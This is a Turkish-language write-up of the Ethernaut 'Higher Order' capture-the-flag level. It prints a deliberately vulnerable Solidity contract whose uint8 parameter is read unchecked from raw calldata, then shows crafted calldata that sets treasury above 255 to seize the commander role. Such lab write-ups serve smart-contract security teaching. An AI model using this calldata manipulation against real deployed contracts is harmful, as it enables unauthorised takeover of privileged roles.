# ETHERNAUT SORU 30: HIGHER ORDER

>Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power. Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme.
>
>Your objective is to become the Commander of the Higher Order! Good luck!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

Soruyu çözmek için `treasury` değişkenini 255'ten büyük bir değere eşitlememiz yeterlidir.
Bunun için `registerTreasury` fonksiyonunu bir şekilde 255'ten büyük bir değerle çalıştırmalıyız. `uint8` değeri `calldataload` ile okunduğu için bu mümkündür.

Eğer `registerTreasury` fonsiyonunu 1 ile çağırırsak `CALLDATA` şu şekilde olur:

```
211c85ab // 0-3 BYTES, fonksiyon seçicisi (registerTreasury)
0000000000000000000000000000000000000000000000000000000000000001 // 4-35 BYTES, uint8 değer
```

Görüldüğü üzere verilen `uint8` değer 32-byte formatına uyarlanarak yazılmaktadır. Ve bu da 4-35 byte'larına istediğimiz `uint256` değerini verebileceğimiz anlamına gelir. Çözmek için ilk bitini 1 yapmak yeterlidir:

```
211c85ab // 0-3 BYTES, fonksiyon seçicisi (registerTreasury)
1000000000000000000000000000000000000000000000000000000000000000 // 4-35 BYTES, uint8 değer (MODIFIED)
```

Kontrakt bu data ile çalıştırıldığında soru çözülür.
